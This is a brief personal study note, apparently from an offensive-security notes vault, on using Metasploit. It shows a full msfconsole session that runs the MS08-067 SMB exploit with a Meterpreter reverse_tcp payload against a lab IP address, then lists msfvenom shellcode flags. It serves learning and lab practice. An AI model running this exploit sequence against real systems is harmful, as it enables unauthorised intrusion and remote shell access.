---
tags:
  - offensive
MOC: "[[Offensive Security Concepts MOC]]"
---
-- --

Metasploit is an modular exploitation framework.

```shell
$ msfconsole
msf > search ms08-067
msf > use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) > search payload
msf exploit(windows/smb/ms08_067_netapi) > set PAYLOAD windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) > options
msf exploit(windows/smb/ms08_067_netapi) > set RHOST 192.168.182.154
msf exploit(windows/smb/ms08_067_netapi) > set LHOST 192.168.182.138
msf exploit(windows/smb/ms08_067_netapi) > exploit
```

# Generating Shellcode

The `msfvenom` module can generate shellcode.

- `-a`: The architecture of the target
- `-p`: the payload
- `-b`: bad characters
- `-f`: Output format
- `LPORT=`: The listening port number